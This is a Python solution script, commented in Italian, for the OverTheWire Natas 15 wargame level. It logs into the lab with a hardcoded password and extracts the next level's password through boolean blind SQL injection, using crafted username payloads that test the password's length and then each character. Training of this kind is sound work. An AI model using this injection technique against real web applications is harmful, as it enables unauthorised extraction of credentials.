"""
	Note:
			data=		> invia dati alla richiesta POST
			params=		> aggiunge parametri all'url: ?name=natas16




"""
import string
import requests 						# per effettuare richieste http
from requests.auth import HTTPBasicAuth # per effettuare autenticazioni via http


# ======= VARS =======

url = "http://natas15.natas.labs.overthewire.org/"
login_username = "natas15"
login_password = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"

# ====================



# ======= FUNCTIONS =======

def find_length(username):
    """Scopre la lunghezza della password confrontando length(password) con N."""
    for n in range(1, 100):
        payload = {"username": username + '" AND length(password)=' + str(n) + ' #'}
        if passwd_check(payload) is True:
            print("[*] Lunghezza password: " + str(n))
            return n
    print("[!] Lunghezza non trovata")
    exit(1)



def passwd_check(payload):

	response = session.post(url + "index.php", data=payload)

	if "This user exists." in response.text:
		return True
	elif "This user doesn't exist." in response.text:
		return False
	else:
		return None


def blind_sql(username, password, length, charset):
    """Estrae la password un carattere alla volta tramite blind SQLi."""
    while len(password) < length:
        #found = False

        for char in charset:
            guess = password + char

            # substring(password, 1, N) -> primi N caratteri della password
            # BINARY -> rende il confronto case-sensitive
            injection = (username + '" AND BINARY substring(password,1,'
                         + str(len(guess)) + ')="' + guess + '" #')

            payload = {"username": injection}

            if passwd_check(payload) is True:
                password = guess
                #found = True
                print(f"[+] Char found -- {len(password):2d}:{char} ->  {password}")
                break

    print("[v] Password trovata: " + password)
    return password


# ======= LOGIN NATAS 15 =======
session = requests.Session() # creazione sessione http
session.auth = HTTPBasicAuth(login_username, login_password) # autenticazione http

response = session.get(url) # GET al server

print("[*] Logging in...")
print("[*] Status code: " + str(response.status_code)) # status code di risposta

#charset = string.ascii_letters + string.digits
blind_sql("natas16", "", find_length("natas16"), string.ascii_letters + string.digits)


